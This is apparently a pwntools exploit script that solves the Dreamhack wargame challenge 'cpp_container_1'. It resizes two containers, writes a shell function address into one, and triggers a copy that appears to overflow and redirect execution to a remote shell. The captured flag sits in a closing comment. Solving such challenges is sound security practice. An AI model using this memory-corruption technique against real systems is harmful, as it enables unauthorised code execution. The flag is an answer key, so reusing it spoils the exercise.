from pwn import *

# p = process("./cpp_container_1")
p = remote("host1.dreamhack.games",8495)

global size1
global size2
size1 = 3
size2 = 3

shell = 0x401041

def make() :
    p.sendlineafter("menu:",str(1))
    for i in range(0,size1-1):
        p.sendlineafter("input:",str(1))    
    p.sendlineafter("input:",str(shell))    
    for i in range(0,size2):
        p.sendlineafter("input:",str(2))    
    
def modify(csize1,csize2) :
    global size1
    global size2 
    size1 = csize1
    size2 = csize2
    p.sendlineafter("menu:",str(2))
    p.sendlineafter("size",str(csize1))
    p.sendlineafter("size",str(csize2))

def copy() :
    p.sendlineafter("menu:",str(3))

def view() : 
    p.sendlineafter("menu:",str(4))

modify(9,3)
make()
pause()
copy()
p.interactive()



#DH{797c9c479e623eb790bd3ae646fb8440}